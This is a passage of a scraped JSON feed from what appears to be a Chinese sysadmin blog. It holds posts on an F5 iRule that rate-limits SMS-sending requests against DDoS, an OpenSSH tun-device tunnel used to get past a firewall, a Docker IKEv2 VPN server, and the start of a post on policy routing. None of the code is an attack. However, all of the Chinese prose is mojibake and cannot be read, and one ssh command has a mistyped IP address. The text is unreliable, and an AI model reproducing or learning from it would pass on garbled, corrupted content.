\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eiruleé‡Œæœ‰ä¸ªéå¸¸ç¥å¥‡çš„ä¸œè¥¿ï¼Œtableï¼Œæ˜¯sessionä¼šè¯è¡¨çš„è¶…è¡¨ï¼ŒåŸºæœ¬æ“ä½œæ˜¯key-valueå‹ï¼Œå¸¦æœ‰ç”Ÿå­˜æ—¶é—´ï¼Œè¿™ç‚¹æœ€é‡è¦ã€‚\u003c/p\u003e\n\u003cp\u003eè¯¦ç»†çš„å¤§å®¶å¯ä»¥å»çœ‹ï¼š\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://clouddocs.f5.com/api/irules/table.html\"\u003ehttps://clouddocs.f5.com/api/irules/table.html\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003eé˜»æ­¢GETçš„iruleï¼š\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ewhen RULE_INIT \u003cspan class=\"o\"\u003e{\u003c/span\u003e  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"nb\"\u003eset\u003c/span\u003e static::windowSecs \u003cspan class=\"m\"\u003e30\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ewhen HTTP_REQUEST \u003cspan class=\"o\"\u003e{\u003c/span\u003e  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"o\"\u003e{\u003c/span\u003e \u003cspan class=\"o\"\u003e(\u003c/span\u003e \u003cspan class=\"o\"\u003e[\u003c/span\u003eHTTP::method\u003cspan class=\"o\"\u003e]\u003c/span\u003e equals \u003cspan class=\"s2\"\u003e\u0026#34;GET\u0026#34;\u003c/span\u003e \u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026amp;\u0026amp;\u003c/span\u003e \u003cspan class=\"o\"\u003e(\u003c/span\u003e \u003cspan class=\"o\"\u003e[\u003c/span\u003eHTTP::uri\u003cspan class=\"o\"\u003e]\u003c/span\u003e starts_with \u003cspan class=\"s2\"\u003e\u0026#34;/sendsms.do\u0026#34;\u003c/span\u003e \u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e}\u003c/span\u003e \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            \u003cspan class=\"nb\"\u003eset\u003c/span\u003e myUserId \u003cspan class=\"o\"\u003e[\u003c/span\u003eIP::client_addr\u003cspan class=\"o\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            \u003cspan class=\"nb\"\u003eset\u003c/span\u003e myMaxRate \u003cspan class=\"m\"\u003e5\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"o\"\u003e{\u003c/span\u003e \u003cspan class=\"nv\"\u003e$myMaxRate\u003c/span\u003e ne \u003cspan class=\"s2\"\u003e\u0026#34;\u0026#34;\u003c/span\u003e \u003cspan class=\"o\"\u003e}\u003c/span\u003e \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                \u003cspan class=\"nb\"\u003eset\u003c/span\u003e reqnum \u003cspan class=\"o\"\u003e[\u003c/span\u003etable incr \u003cspan class=\"s2\"\u003e\u0026#34;req:\u003c/span\u003e\u003cspan class=\"nv\"\u003e$myUserId\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;\u003c/span\u003e\u003cspan class=\"o\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                \u003cspan class=\"nb\"\u003eset\u003c/span\u003e tbl \u003cspan class=\"s2\"\u003e\u0026#34;countpost:\u003c/span\u003e\u003cspan class=\"nv\"\u003e$myUserId\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                table \u003cspan class=\"nb\"\u003eset\u003c/span\u003e -subtable \u003cspan class=\"nv\"\u003e$tbl\u003c/span\u003e \u003cspan class=\"nv\"\u003e$reqnum\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;ignored\u0026#34;\u003c/span\u003e indef \u003cspan class=\"nv\"\u003e$static\u003c/span\u003e::windowSecs\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"o\"\u003e{\u003c/span\u003e \u003cspan class=\"o\"\u003e[\u003c/span\u003etable keys -subtable \u003cspan class=\"nv\"\u003e$tbl\u003c/span\u003e -count\u003cspan class=\"o\"\u003e]\u003c/span\u003e \u0026gt; \u003cspan class=\"nv\"\u003e$myMaxRate\u003c/span\u003e \u003cspan class=\"o\"\u003e}\u003c/span\u003e \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                    HTTP::respond \u003cspan class=\"m\"\u003e403\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;Block\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                    \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eæ¥ä¸ªæ›´åŠ å¤æ‚çš„ä¾‹å­ï¼š\u003c/p\u003e\n\u003cp\u003ePOSTçš„è¯·æ±‚å¦‚ä¸‹ï¼š\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ePOST /api/sendMessage.htm HTTP/1.1  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eContent-Length: \u003cspan class=\"m\"\u003e203\u003c/span\u003e  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eContent-Type: application/x-www-form-urlencoded\u003cspan class=\"p\"\u003e;\u003c/span\u003e \u003cspan class=\"nv\"\u003echarset\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003eUTF-8  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eHost: 172.8.2.23  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eConnection: Keep-Alive  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eUser-Agent: Apache-HttpClient/4.5 \u003cspan class=\"o\"\u003e(\u003c/span\u003eJava/1.7.0_51\u003cspan class=\"o\"\u003e)\u003c/span\u003e  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eAccept-Encoding: gzip,deflate\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003eaction\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003eorder.sumit.order\u003cspan class=\"p\"\u003e\u0026amp;\u003c/span\u003e\u003cspan class=\"nv\"\u003ejsonData\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e%7B%22channelCode%22%3A%22%22%2C%22mobiles%22%3A%5B%2215176989787%22%5D%2C%22source%22%3A%22pop%22%2C%22tempParameters%22%3A%5B%22480827%22%2C%2291%22%5D%2C%22templateId%22%3A2%7D  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eæˆ‘ä»¬è¦é˜»æ­¢POST /api/sendMessage.htmä¸”action=sendmsgçš„è¯ï¼Œå°±æ¯”è¾ƒå¤æ‚ä¸€äº›ï¼Œæˆ‘ä»¬åˆ¤æ–­uriæ»¡è¶³æ¡ä»¶åï¼Œè¿˜è¦è¿›ä¸€æ­¥åˆ¤æ–­contentä¸­action=çš„å†…å®¹ï¼š\u003c/p\u003e","title":"F5åˆ©ç”¨iruleæ¥é˜²æ­¢Ddosçš„æ–¹æ³•"},{"content":"opensshæ˜¯æ”¯æŒéš§é“çš„ï¼Œæ‰€ä»¥å°±å¯ä»¥åœ¨sshä¸­å†å¥—ä¸ªç®¡é“ï¼Œç›´æ¥ç”¨æ¥ç¿»å¢™ï¼Œåšæ³•å¦‚ä¸‹ï¼š\nå¦‚ä¸Šå›¾ï¼ŒAæœºèƒ½sshç™»å½•Bæœº\nAæœºçš„IPï¼š172.16.8.106\nBæœºçš„IPï¼š172.16.8.108\nAæœºå»ºç«‹tunnelåtunçš„ipï¼š192.168.244.1\nBæœºå»ºç«‹tunnelåtunçš„ipï¼š192.168.244.2\né¦–å…ˆç¼–è¾‘Aå’ŒBçš„/etc/ssh/sshd_configï¼Œå…è®¸tunnelï¼Œç¼ºçœæ˜¯ä¸å…è®¸çš„ï¼Œç„¶åservice sshd restart ï¼Œé‡å¯sshd ... PermitTunnel yes ... Aå’ŒBå®‰è£…linuxä¸‹çš„tunè½¯ä»¶ï¼Œå¹¶å¯åŠ¨ä¸€ä¸ªtunnelè®¾å¤‡ yum install tunctl tunctl -t tun5 -u root åœ¨A(172.16.8.106)æœºå™¨ä¸Šç”Ÿæˆkeyï¼Œå¹¶è®¾ç½®èƒ½æ— å¯†ç è¯ä¹¦ç›´æ¥ç™»å½•B(172.16.8.108) ssh-keygen ssh-copy-id root@172.16.8.108 åœ¨Aä¸Šæ‰§è¡Œå‘½ä»¤ï¼Œå»ºç«‹ssh tunnelï¼š ssh -w 5:5 root@172.168.8.108 åœ¨Aä¸Šæ‰§è¡Œ ifconfig tun5 192.168.244.1 pointopoint 192.168.244.2 netmask 255.255.255.0 åœ¨Bä¸Šæ‰§è¡Œ ifconfig tun5 192.168.244.2 pointopoint 192.168.244.1 netmask 255.255.255.0 è¿™æ ·åˆ†åˆ«åœ¨Aå’ŒBä¸Šping 192.168.244.1å’Œ192.168.244.2ï¼Œéƒ½èƒ½é€šå°±è¡¨ç¤ºå·²ç»okäº†ã€‚ ä¼˜åŒ–ä¸€ä¸‹ï¼ŒAå’ŒBä¸¤è¾¹éƒ½å…ˆæŠŠtun5å¯åŠ¨ä»¥åï¼Œç›´æ¥åœ¨Aä¸Šä¸€å¥è¯æå®šï¼Œè¿™ä¸ªä¸ä¼šè‡ªåŠ¨é€€å‡ºï¼Œæ‰€ä»¥å¾—ctrl+zï¼Œç„¶åbgæ”¾åå°å»ï¼Œæˆ–è€…screenæŒ‚ä½ï¼š\nssh \\ -o PermitLocalCommand=yes \\ -o LocalCommand=\u0026#34;ifconfig tun5 192.168.244.1 pointopoint 192.168.244.2 netmask 255.255.255.0\u0026#34; \\ -o ServerAliveInterval=60 \\ -w 5:5 root@172.16.8.108 \\ \u0026#39;ifconfig tun5 192.168.244.2 pointopoint 192.168.244.1 netmask 255.255.255.0; echo tun5 ready\u0026#39; å¦‚æœè¦ç”¨åœ¨ç¿»å¢™çš„ç¯å¢ƒï¼Œé‚£å°±å¾—ä¿æŒé•¿é“¾æ¥äº†ã€‚å‡è®¾Aæœºå™¨æ˜¯åœ¨ä¸€ä¸ªé˜²ç«å¢™åï¼Œä¸”è¢«NATäº†ï¼Œé‚£ä¹ˆå°±å¾—å…ˆè¿™æ ·æ‰“é€šéš§é“ï¼š\nssh -f -w5:5 vpn@example.com \\ -o ServerAliveInterval=30 \\ -o ServerAliveCountMax=5 \\ -o TCPKeepAlive=yes \\ -i ~/.ssh/id_rsa \u0026#34;sleep 1000000000\u0026#34; ç„¶ååœ¨Aå’ŒBä¸Šåˆ†åˆ«å•ç‹¬é…ç½®ipå³å¯ã€‚\nå†è¿›é˜¶ï¼šå‡è®¾Aè¦å»ºç«‹ç‹¬ç«‹çš„netnsç©ºé—´ï¼ŒåŠ ipåŠç½‘å…³å¦‚ä¸‹ï¼š\nip net add ns-vpn ip net exec ip addr add 100.64.42.2/24 dev tun42 ip net exec ip link set up dev tun42 ip net exec ip route add default via 100.64.42.1 å†åœ¨Bçš„/etc/sysctl.confæ‰“å¼€è½¬å‘\nnet.ipv4.ip_forward = 1 sysctl -p iptables -t nat -A POSTROUTING -s 192.168.244.0/24 -j SNAT --to 172.16.8.108 Aå°±å¯ä»¥é€šè¿‡Bä»£ç†å‡ºå»äº†ã€‚\n","permalink":"https://rendoumi.com/posts/20240111-openssh_tunnel/","summary":"\u003cp\u003eopensshæ˜¯æ”¯æŒéš§é“çš„ï¼Œæ‰€ä»¥å°±å¯ä»¥åœ¨sshä¸­å†å¥—ä¸ªç®¡é“ï¼Œç›´æ¥ç”¨æ¥ç¿»å¢™ï¼Œåšæ³•å¦‚ä¸‹ï¼š\u003c/p\u003e\n\u003c!-- raw HTML omitted --\u003e\n\u003cp\u003eå¦‚ä¸Šå›¾ï¼ŒAæœºèƒ½sshç™»å½•Bæœº\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003eAæœºçš„IPï¼š172.16.8.106\u003c/p\u003e\n\u003cp\u003eBæœºçš„IPï¼š172.16.8.108\u003c/p\u003e\n\u003cp\u003eAæœºå»ºç«‹\u003ccode\u003etunnel\u003c/code\u003eåtunçš„ipï¼š192.168.244.1\u003c/p\u003e\n\u003cp\u003eBæœºå»ºç«‹\u003ccode\u003etunnel\u003c/code\u003eåtunçš„ipï¼š192.168.244.2\u003c/p\u003e\u003c/blockquote\u003e\n\u003cul\u003e\n\u003cli\u003eé¦–å…ˆç¼–è¾‘Aå’ŒBçš„/etc/ssh/sshd_configï¼Œå…è®¸tunnelï¼Œç¼ºçœæ˜¯ä¸å…è®¸çš„ï¼Œç„¶åservice sshd restart ï¼Œé‡å¯sshd\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e...\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ePermitTunnel yes  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e...\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cul\u003e\n\u003cli\u003eAå’ŒBå®‰è£…linuxä¸‹çš„tunè½¯ä»¶ï¼Œå¹¶å¯åŠ¨ä¸€ä¸ªtunnelè®¾å¤‡\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eyum install tunctl  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003etunctl -t tun5 -u root  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cul\u003e\n\u003cli\u003eåœ¨A(172.16.8.106)æœºå™¨ä¸Šç”Ÿæˆkeyï¼Œå¹¶è®¾ç½®èƒ½æ— å¯†ç è¯ä¹¦ç›´æ¥ç™»å½•B(172.16.8.108)\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003essh-keygen  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003essh-copy-id root@172.16.8.108  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cul\u003e\n\u003cli\u003eåœ¨Aä¸Šæ‰§è¡Œå‘½ä»¤ï¼Œå»ºç«‹ssh tunnelï¼š\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003essh -w 5:5 root@172.168.8.108  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cul\u003e\n\u003cli\u003eåœ¨Aä¸Šæ‰§è¡Œ\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eifconfig tun5 192.168.244.1 pointopoint 192.168.244.2 netmask 255.255.255.0  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cul\u003e\n\u003cli\u003eåœ¨Bä¸Šæ‰§è¡Œ\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eifconfig tun5 192.168.244.2 pointopoint 192.168.244.1 netmask 255.255.255.0  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cul\u003e\n\u003cli\u003eè¿™æ ·åˆ†åˆ«åœ¨Aå’ŒBä¸Šping 192.168.244.1å’Œ192.168.244.2ï¼Œéƒ½èƒ½é€šå°±è¡¨ç¤ºå·²ç»okäº†ã€‚\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eä¼˜åŒ–ä¸€ä¸‹ï¼ŒAå’ŒBä¸¤è¾¹éƒ½å…ˆæŠŠtun5å¯åŠ¨ä»¥åï¼Œç›´æ¥åœ¨Aä¸Šä¸€å¥è¯æå®šï¼Œè¿™ä¸ªä¸ä¼šè‡ªåŠ¨é€€å‡ºï¼Œæ‰€ä»¥å¾—ctrl+zï¼Œç„¶åbgæ”¾åå°å»ï¼Œæˆ–è€…screenæŒ‚ä½ï¼š\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003essh \u003cspan class=\"se\"\u003e\\ \u003c/span\u003e \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  -o \u003cspan class=\"nv\"\u003ePermitLocalCommand\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003eyes \u003cspan class=\"se\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"se\"\u003e\u003c/span\u003e  -o \u003cspan class=\"nv\"\u003eLocalCommand\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;ifconfig tun5 192.168.244.1 pointopoint 192.168.244.2 netmask 255.255.255.0\u0026#34;\u003c/span\u003e \u003cspan class=\"se\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"se\"\u003e\u003c/span\u003e  -o \u003cspan class=\"nv\"\u003eServerAliveInterval\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"m\"\u003e60\u003c/span\u003e \u003cspan class=\"se\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"se\"\u003e\u003c/span\u003e  -w 5:5 root@172.16.8.108 \u003cspan class=\"se\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"se\"\u003e\u003c/span\u003e  \u003cspan class=\"s1\"\u003e\u0026#39;ifconfig tun5 192.168.244.2 pointopoint 192.168.244.1 netmask 255.255.255.0; echo tun5 ready\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eå¦‚æœè¦ç”¨åœ¨ç¿»å¢™çš„ç¯å¢ƒï¼Œé‚£å°±å¾—ä¿æŒé•¿é“¾æ¥äº†ã€‚å‡è®¾Aæœºå™¨æ˜¯åœ¨ä¸€ä¸ªé˜²ç«å¢™åï¼Œä¸”è¢«NATäº†ï¼Œé‚£ä¹ˆå°±å¾—å…ˆè¿™æ ·æ‰“é€šéš§é“ï¼š\u003c/p\u003e","title":"ç”¨opensshçš„tunnelå»ºç«‹éš§é“ç¿»å¢™"},{"content":"è¿™ç¯‡æ–‡ç« åªé€‚ç”¨äºåœ¨è‡ªå·±çš„vpsä¸Šè¿è¡Œï¼š\næ­¥éª¤å¦‚ä¸‹ï¼š\n1ã€æ‹‰å›æ¥é•œåƒï¼Œikev2-vpn-serverï¼Œè¯è¯´è¿™ä¹ˆå¤šå¹´è¿‡å»äº†ï¼Œä¾ç„¶é€‚ç”¨ï¼Œ2016å¹´åˆ°ç°åœ¨\ndocker pull gaomd/ikev2-vpn-server 2ã€å¯åŠ¨æœåŠ¡ç«¯ï¼Œæ³¨æ„\u0026ndash;privilegedå‚æ•°ï¼Œè¿™ä¸ªæ˜¯å¿…é¡»çš„\ndocker run --privileged -d --name ikev2-vpn-server --restart=always -p 500:500/udp -p 4500:4500/udp gaomd/ikev2-vpn-server:0.3.0 æå®šï¼Œåªéœ€è¦2æ­¥å³å¯å®Œæˆç›¸å¯¹æ¯”è¾ƒéš¾æçš„ikev2çš„å®‰è£….\n3ã€ç”Ÿæˆiphoneå®¢æˆ·ç«¯é…ç½®æ–‡ä»¶\ndocker run -i -t --rm --volumes-from ikev2-vpn-server -e \u0026#34;HOST=vpn.rendoumi.com\u0026#34; gaomd/ikev2-vpn-server:0.3.0 generate-mobileconfig \u0026gt; ikev2-vpn-ihone6s.mobileconfig æ³¨æ„ï¼švpn.rendoumi.comæ›¿æ¢æˆä½ è‡ªå·±å¯¹åº”çš„ipæˆ–è€…åŸŸå\nç„¶åä½ æŠŠè¿™ä¸ªé…ç½®æ–‡ä»¶ä¸‹è½½ï¼Œå®‰è£…åˆ°MacOSæˆ–è€…iOSä¸­ï¼Œå°±å¯ä»¥æ„‰å¿«çš„ç©è€äº†ã€‚\n","permalink":"https://rendoumi.com/posts/20240111-ikev2_docker/","summary":"\u003cp\u003eè¿™ç¯‡æ–‡ç« åªé€‚ç”¨äºåœ¨è‡ªå·±çš„vpsä¸Šè¿è¡Œï¼š\u003c/p\u003e\n\u003cp\u003eæ­¥éª¤å¦‚ä¸‹ï¼š\u003c/p\u003e\n\u003cp\u003e1ã€æ‹‰å›æ¥é•œåƒï¼Œikev2-vpn-serverï¼Œè¯è¯´è¿™ä¹ˆå¤šå¹´è¿‡å»äº†ï¼Œä¾ç„¶é€‚ç”¨ï¼Œ2016å¹´åˆ°ç°åœ¨\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003edocker pull gaomd/ikev2-vpn-server  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e2ã€å¯åŠ¨æœåŠ¡ç«¯ï¼Œæ³¨æ„\u0026ndash;privilegedå‚æ•°ï¼Œè¿™ä¸ªæ˜¯å¿…é¡»çš„\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003edocker run --privileged -d --name ikev2-vpn-server --restart\u003cspan class=\"o\"\u003e=\u003c/span\u003ealways -p 500:500/udp -p 4500:4500/udp gaomd/ikev2-vpn-server:0.3.0\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eæå®šï¼Œåªéœ€è¦2æ­¥å³å¯å®Œæˆç›¸å¯¹æ¯”è¾ƒéš¾æçš„ikev2çš„å®‰è£….\u003c/p\u003e\n\u003cp\u003e3ã€ç”Ÿæˆiphoneå®¢æˆ·ç«¯é…ç½®æ–‡ä»¶\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003edocker run -i -t --rm --volumes-from ikev2-vpn-server -e \u003cspan class=\"s2\"\u003e\u0026#34;HOST=vpn.rendoumi.com\u0026#34;\u003c/span\u003e gaomd/ikev2-vpn-server:0.3.0 generate-mobileconfig \u0026gt; ikev2-vpn-ihone6s.mobileconfig  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eæ³¨æ„ï¼švpn.rendoumi.comæ›¿æ¢æˆä½ è‡ªå·±å¯¹åº”çš„ipæˆ–è€…åŸŸå\u003c/p\u003e\n\u003cp\u003eç„¶åä½ æŠŠè¿™ä¸ªé…ç½®æ–‡ä»¶ä¸‹è½½ï¼Œå®‰è£…åˆ°MacOSæˆ–è€…iOSä¸­ï¼Œå°±å¯ä»¥æ„‰å¿«çš„ç©è€äº†ã€‚\u003c/p\u003e","title":"Dockeræ€¥é€Ÿæ­å»ºè¿è¡Œikev2 vpnæ¥è®©iphoneç¿»å¢™"},{"content":"å¦‚æœæˆ‘ä»¬æœ‰ä¸¤æ¡ä¸Šç½‘çº¿è·¯å¯ä»¥ä½¿ç”¨ï¼Œé‚£ä¹ˆç­–ç•¥è·¯ç”±å°±æ˜¯ä¸ªå¥½çš„é€‰æ‹©äº†ã€‚\nåŸºæœ¬æ¦‚å¿µï¼š\nç­–ç•¥è·¯ç”±è¡¨ï¼ˆPolicy routing tablesï¼‰: Linux ç¼ºçœæœ‰3ä¸ªè¡¨ï¼Œ local (ä¸èƒ½æ”¹ä¹Ÿä¸èƒ½åˆ ), main, å’Œ defaultã€‚æ·»åŠ è·¯ç”±çš„æ—¶å€™å¦‚æœä¸æŒ‡å®šï¼Œç¼ºçœæ˜¯æ·»åŠ åˆ°mainè·¯ç”±è¡¨é‡Œçš„ã€‚ ç­–ç•¥è·¯ç”±è§„åˆ™ï¼ˆPolicy routing rulesï¼‰: Linux ç¼ºçœä¹Ÿæœ‰ä¸‰å¥—è·¯ç”±è§„åˆ™ï¼Œå¯¹åº”ä¸‰ä¸ªç¼ºçœè·¯ç”±è¡¨ã€‚ 